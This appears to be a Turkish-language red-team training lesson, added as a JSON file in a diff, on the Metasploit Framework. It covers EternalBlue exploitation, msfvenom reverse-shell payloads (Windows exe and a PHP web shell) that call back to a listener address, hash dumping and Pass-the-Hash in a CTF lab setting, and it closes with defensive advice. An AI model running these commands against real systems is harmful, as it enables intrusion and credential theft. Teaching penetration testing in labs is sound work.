@@ -1,0 +1,125 @@
+{
+  "id": "metasploit",
+  "slug": "metasploit",
+  "title": "Metasploit Framework",
+  "subtitle": "Sızma Testi Platformu",
+  "description": "Metasploit, exploit geliştirme, çalıştırma ve payload üretimi için kapsamlı bir sızma testi platformudur. Modüler yapısı ile keşif, sömürü ve post-exploitation süreçlerini birleştirir.",
+  "team": "red-team",
+  "category": "Sömürü (Exploitation)",
+  "phase": "Exploitation",
+  "icon": "🎯",
+  "color": "#ef4444",
+  "tags": ["metasploit", "msfconsole", "msfvenom", "exploit", "payload", "meterpreter"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "Temeller ve msfconsole",
+      "description": "Metasploit mimarisi, modül türleri ve ilk exploit",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Metasploit Mimarisi",
+          "content": "**Metasploit Framework (MSF)** modüler bir sömürü platformudur.\n\n**Modül türleri:**\n| Tür | Görev |\n|-----|-------|\n| exploit | Zafiyeti sömürür |\n| payload | Sömürü sonrası çalışan kod (shell, meterpreter) |\n| auxiliary | Tarama, fuzzing, brute force |\n| post | Post-exploitation (bilgi toplama, privesc) |\n| encoder | Payload'ı gizleme/kodlama |\n\n**Temel iş akışı:**\n```\nsearch → use → show options → set → exploit\n```\n\n**Meterpreter:** Metasploit'in gelişmiş payload'ı — dosya transferi, ekran görüntüsü, privesc, pivoting gibi yetenekler sunar.\n\n**CTF ipucu:** Bilinen bir servis/sürüm zafiyeti varsa, `search` ile modül ara, ayarla, çalıştır. Ama OSCP gibi sınavlarda Metasploit kullanımı sınırlıdır — manuel sömürüyü de öğren."
+        },
+        {
+          "id": "installation",
+          "type": "installation",
+          "title": "Kurulum",
+          "installation": {
+            "note": "Kali'de yüklü gelir. İlk çalıştırmada veritabanını başlat.",
+            "linux": ["sudo apt install metasploit-framework -y", "sudo msfdb init", "msfconsole -q"]
+          }
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Temel msfconsole Komutları",
+          "commands": [
+            {
+              "command": "msfconsole -q\nsearch type:exploit eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 10.10.10.1\nexploit",
+              "description": "EternalBlue (MS17-010) exploit'ini ara, seç, ayarla ve çalıştır",
+              "tip": "show options ile zorunlu alanları (RHOSTS, LHOST) gör; set ile doldur, exploit ile çalıştır.",
+              "flags": [
+                { "flag": "search", "description": "Modül ara" },
+                { "flag": "use", "description": "Modül seç" },
+                { "flag": "set RHOSTS", "description": "Hedef IP" },
+                { "flag": "set LHOST", "description": "Dinleyici (senin IP)" },
+                { "flag": "exploit / run", "description": "Çalıştır" }
+              ]
+            },
+            {
+              "command": "sessions -l\nsessions -i 1",
+              "description": "Aktif oturumları listele ve birine bağlan",
+              "tip": "Meterpreter oturumunda: getuid, sysinfo, hashdump, getsystem komutlarını dene."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "msfvenom Payload Üretimi + Lab",
+      "description": "Reverse shell payload, handler ve pratik senaryo",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "msfvenom & Handler",
+          "commands": [
+            {
+              "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe",
+              "description": "Windows meterpreter reverse shell payload üret",
+              "tip": "LHOST = senin IP (tun0). -f formatı: exe, elf, php, raw, psh. Sonraki adım: handler aç.",
+              "flags": [
+                { "flag": "-p", "description": "Payload türü" },
+                { "flag": "LHOST/LPORT", "description": "Geri bağlantı adresi" },
+                { "flag": "-f", "description": "Çıktı formatı" },
+                { "flag": "-e", "description": "Encoder (AV atlatma)" }
+              ]
+            },
+            {
+              "command": "msfconsole -q\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.1\nset LPORT 4444\nrun",
+              "description": "Üretilen payload'a gelen bağlantıyı yakalamak için dinleyici",
+              "tip": "Payload türü ve LHOST/LPORT msfvenom ile AYNI olmalı. Kurban shell.exe'yi çalıştırınca oturum açılır."
+            },
+            {
+              "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php",
+              "description": "Web shell için PHP meterpreter payload",
+              "tip": "Dosya yükleme zafiyeti olan web uygulamalarında kullanılır."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Exploit'ten Meterpreter'a",
+          "scenario": {
+            "title": "Zafiyet Tespiti → Sömürü → Post-Exploitation",
+            "objective": "Bir Windows hedefte bilinen bir SMB zafiyetini Metasploit ile sömür, meterpreter oturumu al ve hash'leri dump et.",
+            "environment": "TryHackMe Blue / HTB Windows makinesi",
+            "difficulty": "intermediate",
+            "steps": [
+              "Tara: nmap -p445 --script smb-vuln-ms17-010 10.10.10.1",
+              "msfconsole'da: use exploit/windows/smb/ms17_010_eternalblue",
+              "set RHOSTS 10.10.10.1, set LHOST tun0, exploit",
+              "Meterpreter'da: getuid (SYSTEM mi?), sysinfo",
+              "hashdump ile parola hash'lerini al",
+              "Hash'leri Hashcat'e ver veya Pass-the-Hash ile yanal hareket et"
+            ],
+            "hints": [
+              "LHOST'u VPN arayüzüne (tun0) ayarla, yoksa bağlantı gelmez",
+              "Exploit başarısızsa target/payload uyumunu kontrol et",
+              "OSCP'de Metasploit kullanımı sınırlı — manuel yöntemi de öğren"
+            ],
+            "defenseNote": "Savunma: Yamaları zamanında uygula (MS17-010 gibi), SMBv1'i kapat, ağ segmentasyonu, EDR/AV ile payload tespiti ve uygulama beyaz listesi kullan."
+          }
+        }
+      ]
+    }
+  ]
+}
